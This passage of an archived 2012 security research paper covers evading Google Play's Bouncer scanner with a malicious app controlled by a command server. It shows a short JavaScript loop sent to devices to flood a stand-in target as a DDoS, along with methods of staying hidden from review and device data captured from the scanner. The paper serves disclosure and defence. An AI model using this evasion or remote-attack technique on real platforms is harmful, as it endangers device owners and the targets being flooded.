                 HttpGet get = new HttpGet(target);\n                        try {\n                           client.execute(get);\n                        } catch (Exception e) {\n                           // ignore\n                        }\n                    }\n\n```\nCopyright © 2012 Trustwave Holdings, Inc. All rights reserved            17\n\n\n-----\n\n```\n                      return null;\n                  }\n               };\n               task.execute();\n             }\n\n```\n`o` Malicious Functionality:\n\n          - At this phase, we wanted to use our C&C server as more of a botnet controller. Since\nwe could dynamically pushdown JavaScript code, we soon realized there was the ability\nto execute similar attack tools used by hacktivists such as LOIC/HOIC to send multiple\nHTTP requests from the victim’s device to DDoS target of our choice.\n\n          - In our labs, we were launching this attack from a single device to a single system, but\nin a practical sense should the application become “popular” and installed on 1000s or\nmillions of devices on 3G/4G networks this attack could easily be performed.\n\n              - `for (var i=0; i < 128; i++) {`\n```\n               Bridge.sendAnalytics(\"http://unsuspecting.fake/target\",\n               100); }\n\n```\n          - We send down this Javascript that tells the device to send thousands and thousands of\nrequests wherever we want, as fast as it can.\n`o` Bouncer Scan Results:\n\n          - They scanned us once.\n\n              - `74.125.19.81`\n\n              - `tmobile:HTC:sapphire:T-Mobile myTouch 3G:opal:sapphire`\n\n#### Making a Purchase\n\nAfter we were successful in updating the application from version 1.0 to 1.7, we decided to attempt to make a\npurchase from one of our lab devices. We wanted to see if there was a function of Bouncer that would perform\na more intense analysis of the application once an actual purchase was made.\n\nFigure 12: Making the first and only purchase of SMS Bloxor\n\nCopyright © 2012 Trustwave Holdings, Inc. All rights reserved            18\n\n\n-----\n\nAfter we made this purchase and installed the application on this device, we were able to test out the\nfunctionality we built into “SMS Bloxor”. Of course, all of the legitimate functionality worked as expected within\nthe application. We also were able to modify the JavaScript code that was sent down to the device every 15\nminutes. One by one we were successfully able to test and demonstrate each piece of malicious functionality as\nwell.\n\nWe did not observe any additional activity by Bouncer as a result of our purchase.\n\n#### Final Test – Let’s Get Caught!\n\nAfter going through the process of updating our application many times, having Google Bouncer scan our\napplication and in turn allow it to be published, we wanted to put the application into “smash and grab” mode to\nattempt to make as much noise as possible, hopefully trigger some detection mechanism.\n\nAfter a few weeks of sitting in the market, Bouncer scanned our app again (without an update). As every time\npreviously, we passed the scan. Shortly after, we submitted a new update, with “minor bugfixes” (i.e., nothing\nhad substantially changed, but the APK was different to try and trigger another scan) and we deactivated the\nC&C server’s IP block on Google’s network. This meant upon the next scan, Bouncer should be hit with the\npossibility of executing our malware.\n\nThey scanned us within minutes, and we served the malware to the scanner. But the scanner went away, and\nnothing had happened. We didn’t receive any of the information we were attempting to gather from Bouncer.\n\nWe needed our malware to get much more aggressive – most people don’t turn off their phone after just a few\nminutes, so to save battery and work better, we had the malware checking in with the C&C server every 15\nminutes. Time to tighten that up a bit.\n\nWe submitted a new update with the check-in interval down from 15 minutes to 1 second. Our malware was\nnow acting in a way that it never would in real life, but we wanted to do something to make Bouncer notice us.\n\nThe scanner sent us back some information:\n\nContacts: 412-722-5225[10], 202-456-1111[11]\n\nPhone number: 15555215877\n\nVoicemail: 15552175049\n\nANDROID_ID: 9774d56d682e549c\n\nDevice ID: 112358132134559\n\nSubscriber ID: 310260509066168\n\nSIM Serial Number: 89014103211118510720\n\nWe also learned that the scanner did not have any camera photos, or phone records, or SMS records. This\nwasn’t surprising; it’s not a real phone.\n\nThis time, the scanner acted differently than it ever had before. It scanned us 19 times within 6 minutes.\n\n10 This number is located in Pennsylvania and registered to someone named “Wilson Miller”.\n11 This number is the White House.\n\nCopyright © 2012 Trustwave Holdings, Inc. All rights reserved            19\n\n\n-----\n\n| \r 74.125.114.83 \r  \r | \r tmobile:HTC:sapphire:T-­‐Mobile \r myTouch \r 3G:opal:sapphire \r | \r 2012-­‐05-­‐02 \r 18:07:02 \r |\n\n| \r 74.125.112.81 \r  \r | \r tmobile:HTC:sapphire:T-­‐Mobile \r myTouch \r 3G:opal:sapphire \r | \r 2012-­‐05-­‐02 \r 18:07:02 \r |\n\n| \r 74.125.114.94 \r  \r | \r tmobile:HTC:sapphire:T-­‐Mobile \r myTouch \r 3G:opal:sapphire \r | \r 2012-­‐05-­‐02 \r 18:07:02 \r |\n\n| \r 74.125.112.85 \r  \r | \r tmobile:HTC:sapphire:T-­‐Mobile \r myTouch \r 3G:opal:sapphire \r | \r 2012-­‐05-­‐02 \r 18:07:20 \r |\n\n| \r 74.125.112.90 \r  \r | \r tmobile:HTC:sapphire:T-­‐Mobile \r myTouch \r 3G:opal:sapphire \r | \r 2012-­‐05-­‐02 \r 18:07:20 \r |\n\n| \r 74.125.112.82 \r  \r | \r tmobile:HTC:sapphire:T-­‐Mobile \r myTouch \r 3G:opal:sapphire \r | \r 2012-­‐05-­‐02 \r 18:07:20 \r |\n\n| \r 74.125.114.87 \r  \r | \r tmobile:HTC:sapphire:T-­‐Mobile \r myTouch \r 3G:opal:sapphire \r | \r 2012-­‐05-­‐02 \r 18:07:20 \r |\n\n| \r 74.125.114.89 \r  \r | \r tmobile:HTC:sapphire:T-­‐Mobile \r myTouch \r 3G:opal:sapphire \r | \r 2012-­‐05-­‐02 \r 18:07:20 \r |\n\n| \r 74.125.112.91 \r  \r | \r tmobile:HTC:sapphire:T-­‐Mobile \r myTouch \r 3G:opal:sapphire \r | \r 2012-­‐05-­‐02 \r 18:07:20 \r |\n\n| \r 74.125.112.80 \r  \r | \r tmobile:HTC:sapphire:T-­‐Mobile \r myTouch \r 3G:opal:sapphire \r | \r 2012-­‐05-­‐02 \r 18:07:20 \r |\n\n| \r 74.125.114.86 \r  \r | \r tmobile:HTC:sapphire:T-­‐Mobile \r myTouch \r 3G:opal:sapphire \r | \r 2012-­‐05-­‐02 \r 18:07:20 \r |\n\n| \r 74.125.112.108 \r | \r tmobile:HTC:sapphire:T-­‐Mobile \r myTouch \r 3G:opal:sapphire \r | \r 2012-­‐05-­‐02 \r 18:07:20 \r |\n\n| \r 74.125.114.83 \r  \r | \r tmobile:HTC:sapphire:T-­‐Mobile \r myTouch \r 3G:opal:sapphire \r | \r 2012-­‐05-­‐02 \r 18:13:17 \r |\n\n| \r 74.125.114.95 \r  \r | \r tmobile:HTC:sapphire:T-­‐Mobile \r myTouch \r 3G:opal:sapphire \r | \r 2012-­‐05-­‐02 \r 18:13:27 \r |\n\n| \r 74.125.114.83 \r  \r | \r tmobile:HTC:sapphire:T-­‐Mobile \r myTouch \r 3G:opal:sapphire \r | \r 2012-­‐05-­‐02 \r 18:13:27 \r |\n\n| \r 74.125.112.103 \r | \r tmobile:HTC:sapphire:T-­‐Mobile \r myTouch \r 3G:opal:sapphire \r | \r 2012-­‐05-­‐02 \r 18:13:27 \r |\n\n| \r 74.125.114.86 \r  \r | \r tmobile:HTC:sapphire:T-­‐Mobile \r myTouch \r 3G:opal:sapphire \r | \r 2012-­‐05-­‐02 \r 18:13:27 \r |\n\n| \r 74.125.114.88 \r  \r | \r tmobile:HTC:sapphire:T-­‐Mobile \r myTouch \r 3G:opal:sapphire \r | \r 2012-­‐05-­‐02 \r 18:13:27 \r |\n\n| \r 74.125.112.98 \r  \r | \r tmobile:HTC:sapphire:T-­‐Mobile \r myTouch \r 3G:opal:sapphire \r | \r 2012-­‐05-­‐02 \r 18:13:27 \r |\n\n\nWe’d discovered that the scanner runs for less than 30 seconds per scan. And apparently it thought it found\nsomething suspicious, because after the first scan, it scanned us again just 6 minutes later.\n\nEven after all of this scanning, the malicious application remained within Google Play for approximately 24\nhours. After which it was removed, perhaps after some manual verification and then our developer account\nreceived the following email from Google:\n\nCopyright © 2012 Trustwave Holdings, Inc. All rights reserved            20\n\n\nFigure 13: Bouncer In Aggressive Mode\n\n\n-----\n\nFigure 14: Bouncer Bounced Us\n\nCopyright © 2012 Trustwave Holdings, Inc. All rights reserved            21\n\n\n-----\n\n## What We Learned About “Bouncer”\n\nWe went into this research knowing only what Google had publically disclosed about Bouncer. We were able to\nvalidate that he was in fact automated and performing behavior-based review of the applications submitted.\n\nThrough all of this we were able to draw an interesting comparison Google’s Bouncer with a real “bouncer” that\nyou might find at your local tavern:\n\nIf you are not of legal drinking age, the only barrier between you and a cold craft beer at a pub is the bouncer\nat the door. It is the bouncer’s job not only to ID each patron, but also to perform some visual analysis to see if\nthere might be some trouble before you are let into the establishment. To bypass a bouncer in the real-world,\nall one has to do is have a very good fake ID and not look like they are going to cause trouble while inside the\nbar. The main difference between our bar analogy is that in the real world you are in a controlled environment\nonce you are validated as “safe”. Obviously, once our underage drinker begins to get unruly they will be\ndetected within the bar and be kicked out by the bouncer.\n\nA problem with Google’s method of malware prevention is that by showing up with a legitimate developer\naccount and submitting an application that looks, smells, and feels safe, we were allowed to publish our\nmalicious application. We did this not once, but many times after the initial publication of our benign application.\nSince they are not monitoring the activity of our application once it is installed on a real user’s device, if the\napplication decides to turn malicious they have zero visibility into what’s happening and therefore can’t detect\nthe problem – until a savvy end user reports it as malicious.\n\nInstead of just checking application for malicious functionality upon submission, perhaps some behavior\nmonitoring can be performed on the devices as well.\n\nSince Google reviews the application during the submission process, they could request a functionality map from\nthe developer. With this in hand they should be able to map out its functionality and actions during review. They\ncould keep this information on record for each application that is validated as well. This map could then be\nincluded with the application download and used on the end user’s device to self-police applications that have\nbeen installed. If the application attempts to step outside the bounds that it was submitted to perform, the\ndevice itself could halt the operation and prompt the end user to perform some a simple decision:\n\n  - Allow the application to proceed\n\n  - Terminate the application\n\nAt this point the details of the application in violation could be reported to Google’s security team for possible\nremoval from the Google Play market.\n\nAdditionally, Google should strictly limit the functionality of the Javascript bridge. The only code that should be\nable to access the user’s or the phone’s data through the SDK must be code signed and distributed within the\nAPK – Javascript that is downloaded over the internet after the app is installed should not be executed with full\nprivileges.\n\nCopyright © 2012 Trustwave Holdings, Inc. All rights reserved            22\n\n\n-----\n\n## Conclusions\n\nApplication markets with malware detection can easily be bypassed. It is very difficult for both automated and\nmanual reviews to detect malicious functionality with the time constraints placed upon the reviewing parties.\nThe malware authors only need to ensure that their malware does not exhibit any malicious functionality during\nthe application review process and then just enable it at their discretion.\n\nApplications, like Facebook, that utilize a Javascript bridge cannot be used within trusted environments. This\nfunctionality would allow any application to bypass an automated or manual application review process. This will\nresult in an application that could decide to become malicious even AFTER it has been certified benign by the\nreviewer or review process.\n\nAs mobile applications continue to evolve, new controls need to be developed and put into place that will limit a\ndeveloper’s ability to covertly insert malicious or privacy violating functionality into their applications after the\napplication store custodian’s review process.\n\nThis issue will continue to be a challenge for both public application markets and also private/corporate\napplication markets that are being planned or implemented by organizations today.\n\nCopyright © 2012 Trustwave Holdings, Inc. All rights reserved            23\n\n\n-----\n\n## About the Authors\n\n#### Nicholas J. Percoco\n\nWith more than 15 years of information security experience, Percoco leads the global SpiderLabs organization\nthat has performed more than 1300 computer incident response and forensic investigations globally, run\nthousands of ethical hacking and application security tests for clients, and conduct bleeding-edge security\nresearch to improve Trustwave's products.\n\nPrior to joining Trustwave, Percoco ran security consulting practices at VeriSign, and Internet Security Systems.\nIn 2004, he drafted an application security framework that became known as the Payment Application Best\nPractices (PABP). In 2008, this framework was adopted as a global standard called Payment Application Data\nSecurity Standard (PA-DSS).\n\nAs a speaker, he has provided unique insight around security breaches, malware, mobile security and InfoSec\ntrends to public (Black Hat, DEFCON, SecTor, You Sh0t the Sheriff, OWASP) and private audiences (Including\nDHS, US-CERT, Interpol, United States Secret Service) throughout North America, South America, Europe, and\nAsia.\n\nPercoco and his research has been featured by many news organizations including:The Washington Post,\neWeek, PC World, CNET, Wired, Hakin9, Network World, Dark Reading, Fox News, USA Today, Forbes,\nComputerworld, CSO Magazine, CNN, The Times of London, NPR, Gizmodo, Fast Company, Financial Times and\nThe Wall Street Journal.\n\nIn 2011, SC Magazine named Percoco Security Researcher of the Year. In addition, he was inducted into the\ninaugural class of the Illinois State University College of Applied Science and Technology Academy of\nAchievement.\n\nPercoco is a member of the Dean's Advisory Board for The College of Applied Science & Technology at Illinois\nState University and a co-creator on the planning committee of THOTCON, a hacking conference held in Chicago\neach year. He has a Bachelor of Science in Computer Science from Illinois State University.\n\n#### Sean Schulte\n\nSean is a backend engineer on the Trustwave SSL team. He writes and maintains services using Java, Ruby,\nPython, PHP, MySQL, MongoDB, and Redis.\n\nAs a malware researcher, Sean discovered a “focus stealing” design flaw in Android, and presented it at\nDEFCON. He has also analyzed Android malware found in the wild, determining its behavior by reading the\nDalvik bytecode.\n\nHe develops mobile apps and games for both iOS and Android. His most popular app is MLB Scoreboard, for\nAndroid, which provides live baseball scores; it contains no malware. On iOS, his most successful app is Fun\nBalloon, a simple game for young children to help them learn colors.\n\nSean has a degree in Computer Science from the University of Chicago.\n\nCopyright © 2012 Trustwave Holdings, Inc. All rights reserved            24\n\n\n-----\n\n## About Trustwave\n\nTrustwave is a leading provider of compliance, Web, application, network and data security solutions delivered\nthrough the cloud, managed security services, software and appliances. For organizations faced with today's\nchallenging data security and compliance environment, Trustwave provides a unique approach with\ncomprehensive solutions that include its TrustKeeper® portal and other proprietary security solutions.\nTrustwave has helped hundreds of thousands of organizations--ranging from Fortune 500 businesses and large\nfinancial institutions to small and medium-sized retailers--manage compliance and secure their network\ninfrastructures, data communications and critical information assets. Trustwave is headquartered in Chicago\nwith offices worldwide. For more information, visit https://www.trustwave.com.\n\n#### About Trustwave SpiderLabs\n\nSpiderLabs is the advanced security team within Trustwave focused on forensics, ethical hacking and application\nsecurity testing for our premier clients. The team has performed hundreds of forensic investigations, thousands\nof ethical hacking exercises and hundreds of application security tests globally. In addition, the SpiderLabs\nResearch team provides intelligence through bleeding-edge research and proof of concept tool development to\nenhance Trustwave's products and services. For more information, visit\nhttps://www.trustwave.com/spiderLabs.php.\n\n#### Contacts\n\n\n**Corporate**\n**Headquarters**\n\n70 West Madison St.\nSuite 1050\nChicago, IL 60602\n\nP: 312.873.7500\nF: 312.443.8028\n\n\n**EMEA**\n**Headquarters**\n\nWestminster Tower\n3 Albert Embankment\nLondon SE1 7SP\n\nP: +44 (0) 845 456 9611\nF: +44 (0) 845 456 9612\n\n\n**LAC**\n**Headquarters**\n\nRua Cincinato Braga,\n340 nº 71\nEdificio Delta Plaza\nBairro Bela Vista São Paulo - SP\nCEP: 01333-010 - BRASIL\n\nP: +55 (11) 4064-6101\n\n\n**APAC Headquarters**\n\nLevel 26\n44 Market Street\nSydney NSW 2000,\nAustralia\n\nP: +61 2 9089 8870\nF: +61 2 9089 8989\n\n\nCopyright © 2012 Trustwave Holdings, Inc. All rights reserved            25\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "99fdc3ef-333d-48f5-a4a1-becd788c7b80",
            "created_at": "2022-10-25T15:28:29.802983Z",
            "updated_at": "2022-10-25T15:28:29.802983Z",
            "deleted_at": null,
            "name": "MITRE",
            "url": "https://github.com/mitre-attack/attack-stix-data",
            "description": "MITRE ATT&CK STIX Data",
            "reports": null
        }
    ],
    "references": [
        "https://media.blackhat.com/bh-us-12/Briefings/Percoco/BH_US_12_Percoco_Adventures_in_Bouncerland_WP.pdf"
    ],
    "report_names": [
        "BH_US_12_Percoco_Adventures_in_Bouncerland_WP.pdf"
    ],
    "threat_actors": [
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1666716504,
    "ts_updated_at": 1743041785,
    "ts_creation_date": 1342044028,
    "ts_modification_date": 1342044028,
    "files": {
        "pdf": "https://archive.orkl.eu/50a78f9df0196803cbbb6b6fe9c79aa0811a42a4.pdf",
        "text": "https://archive.orkl.eu/50a78f9df0196803cbbb6b6fe9c79aa0811a42a4.txt",
        "img": "https://archive.orkl.eu/50a78f9df0196803cbbb6b6fe9c79aa0811a42a4.jpg"
    }
}